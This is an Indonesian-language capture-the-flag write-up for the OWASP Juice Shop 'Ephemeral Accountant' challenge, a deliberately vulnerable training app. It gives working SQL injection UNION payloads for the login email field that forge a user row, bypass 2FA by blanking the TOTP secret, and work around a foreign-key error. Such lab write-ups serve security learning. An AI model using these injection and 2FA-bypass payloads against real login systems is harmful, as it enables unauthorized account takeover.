# Ephemeral Accountant

## Deskripsi

Login ke akun **[acc0unt4nt@juice-sh.op](mailto:acc0unt4nt@juice-sh.op)** tanpa pernah mendaftarkan user tersebut.

## Resource

* [PortSwigger – Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* [PortSwigger – UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

---

## Langkah-langkah

### 1. Identifikasi struktur tabel `Users`

Dari challenge **Database Schema**, diketahui tabel `Users` memiliki 13 kolom:

```
id, username, email, password, role, deluxeToken,
lastLoginIp, profileImage, totpSecret, isActive,
createdAt, updatedAt, deletedAt
```

<img width="1919" height="1140" alt="schema" src="https://github.com/user-attachments/assets/59ac8d25-3050-4922-a6a8-ff5aee2ba325" />

---

### 2. Masuk ke halaman login

<img width="1536" height="895" alt="Screenshot 2025-09-10 at 11 05 23" src="https://github.com/user-attachments/assets/591c84f4-3981-440c-b853-6a155f9b1382" />

---

### 3. Buat payload awal

Payload dimasukkan pada kolom **Email**:

```sql
admin' UNION SELECT * FROM (
  SELECT 67, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op',
  'aaaa', 'Administrator', '1234', '127.0.0.1',
  '/assets/public/images/uploads/default.svg',
  '676941', 0, 1, 2, 3
)--
```

<img width="1536" height="895" alt="Screenshot 2025-09-10 at 11 06 08" src="https://github.com/user-attachments/assets/5e4d6b39-2852-4d93-9702-614f31956b09" />

Akun berhasil dibuat di hasil query, tetapi login gagal karena ada **2FA**.

<img width="1536" height="895" alt="Screenshot 2025-09-10 at 11 03 44" src="https://github.com/user-attachments/assets/ec8d6c47-81f7-4b3d-882c-55a0dfaebf4d" />

---

### 4. Atasi 2FA (kosongkan `totpSecret`)

Agar tidak diminta token 2FA, set kolom `totpSecret` menjadi kosong:

```sql
admin' UNION SELECT * FROM (
  SELECT 67, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op',
  'aaaa', 'Administrator', '1234', '127.0.0.1',
  '/assets/public/images/uploads/default.svg',
  '', 0, 1, 2, 3
)--
```

<img width="1536" height="895" alt="Screenshot 2025-09-10 at 11 13 16" src="https://github.com/user-attachments/assets/23dd23ce-1f0d-4037-8f86-860439c171ae" />

---

### 5. Perbaiki error Foreign Key

Muncul error:

```
FOREIGN KEY constraint failed
```

Hal ini karena `id = 67` tidak valid. Solusi → gunakan `id` yang lebih kecil, misalnya `20`.

Payload final:

```sql
admin' UNION SELECT * FROM (
  SELECT 20, 'acc0unt4nt@juice-sh.op', 'acc0unt4nt@juice-sh.op',
  'aaaa', 'Administrator', '1234', '127.0.0.1',
  '/assets/public/images/uploads/default.svg',
  '', 0, 1, 2, 3
)--
```

<img width="1536" height="895" alt="Screenshot 2025-09-10 at 11 13 16" src="https://github.com/user-attachments/assets/004d5235-b1b1-4943-ae2e-b30fb1fd21b1" />

Akhirnya berhasil login sebagai **[acc0unt4nt@juice-sh.op](mailto:acc0unt4nt@juice-sh.op)**.

<img width="979" height="502" alt="Screenshot 2025-09-10 at 11 26 28" src="https://github.com/user-attachments/assets/f03460ed-ee9f-47fe-bca0-51a53386543b" />

---

## Catatan Penting

* Karena **schema `Users`** sudah diketahui, payload dapat dibuat langsung tanpa trial-error jumlah kolom.
* Error **2FA** muncul karena kolom `totpSecret` tidak kosong → solusinya dikosongkan.
* Error **Foreign Key constraint** menunjukkan `id` harus konsisten dengan constraint database.
* Database menggunakan **SQLite**, terlihat dari akses `sqlite_schema`.
